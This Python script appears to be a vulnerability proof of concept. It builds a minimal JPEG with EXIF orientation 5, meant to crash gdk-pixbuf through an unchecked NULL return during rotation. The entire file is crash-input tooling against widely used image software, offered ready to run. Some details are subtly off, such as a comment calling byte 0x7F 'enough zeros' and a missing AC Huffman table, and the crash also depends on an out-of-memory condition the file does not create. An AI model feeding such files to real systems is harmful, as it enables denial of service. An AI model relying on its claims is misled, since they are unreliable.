#!/usr/bin/env python3
"""
vuln_001_gen.py

Constructs a minimal JPEG with EXIF orientation=5 using only
Python struct/bytes primitives. No external libraries or target
library calls are used.

Vulnerability: NULL Pointer Dereference via unchecked
gdk_pixbuf_rotate_simple return in
gdk_pixbuf_apply_embedded_orientation (gdk-pixbuf-util.c, case 5/7).

When orientation=5 and gdk_pixbuf_rotate_simple returns NULL (OOM),
the NULL pointer is passed directly to gdk_pixbuf_flip(), which
dereferences src->colorspace on its first line -> crash.
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.jpeg")


def build_exif_app1_orientation5() -> bytes:
    """
    Build an APP1 (EXIF) block with Orientation tag = 5.

    TIFF layout (little-endian):
      Offset 0x00: "II"  (little-endian marker)
      Offset 0x02: 0x002A (TIFF magic)
      Offset 0x04: 0x00000008 (offset to first IFD)
      Offset 0x08: IFD
        - entry count: 1
        - tag  0x0112 (Orientation), type SHORT (3), count 1, value 5
        - next IFD offset: 0x00000000
    """
    # TIFF header (little-endian)
    tiff_header = b"II"                     # byte order mark: little-endian
    tiff_header += struct.pack("<H", 42)    # TIFF magic
    tiff_header += struct.pack("<I", 8)     # offset to first IFD

    # IFD: 1 entry
    ifd_entry_count = struct.pack("<H", 1)

    # IFD entry for Orientation (tag 0x0112)
    tag        = struct.pack("<H", 0x0112)  # Orientation
    type_short = struct.pack("<H", 3)       # SHORT
    count      = struct.pack("<I", 1)
    # For SHORT values that fit in 4 bytes, value is stored left-justified
    value      = struct.pack("<HH", 5, 0)  # orientation = 5, padding

    ifd_entry = tag + type_short + count + value
    next_ifd  = struct.pack("<I", 0)        # no more IFDs

    tiff_data = tiff_header + ifd_entry_count + ifd_entry + next_ifd

    # APP1 payload: "Exif\x00\x00" + TIFF data
    exif_payload = b"Exif\x00\x00" + tiff_data

    # APP1 marker + 2-byte length (includes the 2 length bytes themselves)
    app1_length = struct.pack(">H", 2 + len(exif_payload))
    app1 = b"\xFF\xE1" + app1_length + exif_payload
    return app1


def build_minimal_jpeg_1x1_gray() -> bytes:
    """
    Build the smallest valid JPEG that decoders will accept:
    1x1 grayscale image with minimal Huffman tables.

    Structure: SOI APP1 SOF0 DHT SOS EOI
    """
    soi = b"\xFF\xD8"

    app1 = build_exif_app1_orientation5()

    # SOF0 — Start Of Frame (baseline DCT), 1x1 grayscale
    # Length = 8 + 3*components = 8 + 3*1 = 11
    sof0_payload = struct.pack(
        ">HBHHB",
        11,     # segment length
        8,      # precision (bits)
        1,      # height
        1,      # width
        1,      # number of components
    )
    # component: id=1, sampling=0x11 (1h x 1v), quant table id=0
    sof0_payload += struct.pack("BBB", 1, 0x11, 0)
    sof0 = b"\xFF\xC0" + sof0_payload

    # DQT — Define Quantization Table (all 1s, id=0)
    # Length = 2 + 1 + 64 = 67
    quant_table = bytes([1] * 64)
    dqt_payload = struct.pack(">HB", 67, 0x00) + quant_table
    dqt = b"\xFF\xDB" + dqt_payload

    # DHT — Define Huffman Table (minimal DC table for component 0)
    # Huffman table class=DC (0), id=0
    # counts: 1 symbol of length 1 (value 0x00)
    # Total DHT segment length = 2 + 1 + 16 + 1 = 20
    counts = bytes([1] + [0] * 15)  # 16 length-count bytes
    symbols = bytes([0x00])          # 1 symbol
    dht_payload = struct.pack(">HB", 2 + 1 + 16 + len(symbols), 0x00) + counts + symbols
    dht = b"\xFF\xC4" + dht_payload

    # SOS — Start Of Scan
    # Header: length=8+2*components, component specs, Ss=0, Se=63, Ah/Al=0
    sos_header = struct.pack(">HB", 8, 1)       # length, num components
    sos_header += struct.pack("BB", 1, 0x00)    # comp id=1, DC/AC table ids
    sos_header += struct.pack("BBB", 0, 63, 0) # Ss, Se, Ah/Al
    sos_marker = b"\xFF\xDA" + sos_header

    # Minimal scan data: one MCU encoding DC coefficient = 0 for 1 component
    # Huffman-coded: size=0 -> code 0 (1 bit "0"), byte-stuffed to full byte
    # A single 0xD9 would be misread as EOI; use a proper byte instead.
    scan_data = bytes([0x7F])  # bit stream: enough zeros for the MCU

    eoi = b"\xFF\xD9"

    jpeg = soi + app1 + dqt + sof0 + dht + sos_marker + scan_data + eoi
    return jpeg


def main():
    jpeg_bytes = build_minimal_jpeg_1x1_gray()
    with open(OUTPUT, "wb") as f:
        f.write(jpeg_bytes)
    print(f"Written {len(jpeg_bytes)} bytes -> {OUTPUT}")

    # Sanity-check: verify SOI, APP1 marker, and Exif signature
    assert jpeg_bytes[:2] == b"\xFF\xD8", "Missing SOI"
    assert jpeg_bytes[2:4] == b"\xFF\xE1", "Missing APP1"
    exif_sig_offset = 6  # after SOI(2) + APP1_marker(2) + length(2)
    assert jpeg_bytes[exif_sig_offset:exif_sig_offset+6] == b"Exif\x00\x00", \
        "Missing Exif signature"
    print("Sanity checks passed.")


if __name__ == "__main__":
    main()
